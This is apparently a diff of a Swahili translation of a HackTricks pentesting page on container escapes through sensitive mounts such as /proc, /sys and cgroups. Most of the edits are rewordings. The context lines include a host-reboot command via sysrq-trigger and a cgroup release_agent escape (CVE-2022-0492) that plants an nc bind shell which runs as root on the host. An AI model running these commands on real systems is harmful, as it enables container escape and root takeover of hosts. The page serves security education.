@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Ufunuo wa `/proc`, `/sys`, na `/var` bila kutengwa kwa namespace kunaleta hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa uso wa shambulio na ufichuzi wa taarifa. Maktaba hizi zina faili nyeti ambazo, ikiwa zimepangwa vibaya au kufikiwa na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko ya mwenyeji, au kutoa taarifa zinazosaidia mashambulizi zaidi. Kwa mfano, kuunganisha vibaya `-v /proc:/host/proc` kunaweza kupita ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, na kuacha `/host/proc` bila ulinzi.
+Ufunuo wa `/proc`, `/sys`, na `/var` bila kutengwa kwa namespace kunaleta hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa uso wa shambulio na ufunuo wa taarifa. Maktaba haya yana faili nyeti ambazo, ikiwa zimepangwa vibaya au kufikiwa na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko ya mwenyeji, au kutoa taarifa zinazosaidia mashambulizi zaidi. Kwa mfano, kuunganisha vibaya `-v /proc:/host/proc` kunaweza kupita ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, na kuacha `/host/proc` bila ulinzi.
 
 **Unaweza kupata maelezo zaidi ya kila hatari inayoweza kutokea katika** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -15,7 +15,7 @@ Maktaba hii inaruhusu ufikiaji wa kubadilisha vigezo vya kernel, kawaida kupitia
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Imeelezwa katika [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Ikiwa unaweza kuandika ndani ya faili hii inawezekana kuandika bomba `|` ikifuatiwa na njia ya programu au script ambayo itatekelezwa baada ya ajali kutokea.
+- Ikiwa unaweza kuandika ndani ya faili hii inawezekana kuandika bomba `|` ikifuatiwa na njia ya programu au skripti ambayo itatekelezwa baada ya ajali kutokea.
 - Mshambuliaji anaweza kupata njia ndani ya mwenyeji kwa kontena lake akitekeleza `mount` na kuandika njia ya binary ndani ya mfumo wa faili wa kontena lake. Kisha, angamiza programu ili kufanya kernel itekeleze binary nje ya kontena.
 
 - **Mfano wa Upimaji na Ukatili**:
@@ -49,7 +49,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Imeelekezwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Imejumuishwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 - Bendera ya kimataifa inayodhibiti ikiwa kernel inapaswa kuanguka au kuitisha OOM killer wakati hali ya OOM inatokea.
 
 #### **`/proc/sys/fs`**
@@ -59,9 +59,9 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Inaruhusu kujiandikisha kwa wakalimani wa fomati za binary zisizo za asili kulingana na nambari yao ya uchawi.
-- Inaweza kusababisha kupanda kwa haki au upatikanaji wa shell ya root ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
-- Uthibitisho wa husika na maelezo:
+- Inaruhusu kujiandikisha kwa wakalimani wa muundo wa binary usio wa asili kulingana na nambari yake ya uchawi.
+- Inaweza kusababisha kupanda kwa haki au upatikanaji wa root shell ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
+- Ukatili unaohusiana na maelezo:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Mafunzo ya kina: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
@@ -70,7 +70,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
 #### **`/proc/config.gz`**
 
 - Inaweza kufichua usanidi wa kernel ikiwa `CONFIG_IKCONFIG_PROC` imewezeshwa.
-- Inatumika kwa washambuliaji kubaini udhaifu katika kernel inayotumika.
+- Inafaida kwa washambuliaji kubaini udhaifu katika kernel inayotumika.
 
 #### **`/proc/sysrq-trigger`**
 
@@ -78,24 +78,24 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
 - **Mfano wa Kuanzisha Upya Mwenyeji**:
 
 ```bash
-echo b > /proc/sysrq-trigger # Inaanzisha upya mwenyeji
+echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 ```
 
 #### **`/proc/kmsg`**
 
 - Inafichua ujumbe wa buffer ya ring ya kernel.
-- Inaweza kusaidia katika mashambulizi ya kernel, kuvuja anwani, na kutoa taarifa nyeti za mfumo.
+- Inaweza kusaidia katika ukosefu wa kernel, kuvuja kwa anwani, na kutoa taarifa nyeti za mfumo.
 
 #### **`/proc/kallsyms`**
 
 - Inataja alama za kernel zilizotolewa na anwani zao.
-- Muhimu kwa maendeleo ya mashambulizi ya kernel, hasa kwa kushinda KASLR.
-- Taarifa za anwani zinapunguzwa ikiwa `kptr_restrict` imewekwa kuwa `1` au `2`.
+- Muhimu kwa maendeleo ya ukosefu wa kernel, hasa kwa kushinda KASLR.
+- Taarifa za anwani zimewekwa vizuizi ikiwa `kptr_restrict` imewekwa kuwa `1` au `2`.
 - Maelezo katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/[pid]/mem`**
 
-- Inafanya kazi na kifaa cha kumbukumbu ya kernel `/dev/mem`.
+- Inashirikiana na kifaa cha kumbukumbu ya kernel `/dev/mem`.
 - Kihistoria ilikuwa na udhaifu wa mashambulizi ya kupanda kwa haki.
 - Zaidi kuhusu [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
@@ -131,7 +131,7 @@ echo b > /proc/sysrq-trigger # Inaanzisha upya mwenyeji
 #### **`/sys/kernel/uevent_helper`**
 
 - Inatumika kwa kushughulikia `uevents` za kifaa cha kernel.
-- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo na mipaka wakati wa kuanzisha `uevent`.
+- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo za kawaida wakati wa kuanzisha `uevent`.
 - **Mfano wa Ukatili**:
 ```bash
 
@@ -264,7 +264,7 @@ the other containers' filesystems are available under a different base path:
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
 Dereva ya Hifadhi: overlay2
-Dir ya Mzizi ya Docker: /var/lib/docker
+Dir ya Msingi ya Docker: /var/lib/docker
 ```
 
 So the filesystems are under `/var/lib/docker/overlay2/`:
@@ -319,7 +319,7 @@ mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
 echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requires CVE-2022-0492
 
 echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
-sh -c "echo 0 > /tmp/x/cgroup.procs"  # triggers the empty-cgroup event
+sh -c "echo 0 > /tmp/x/cgroup.procs"  # inasababisha tukio la empty-cgroup
 ```
 
 When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.
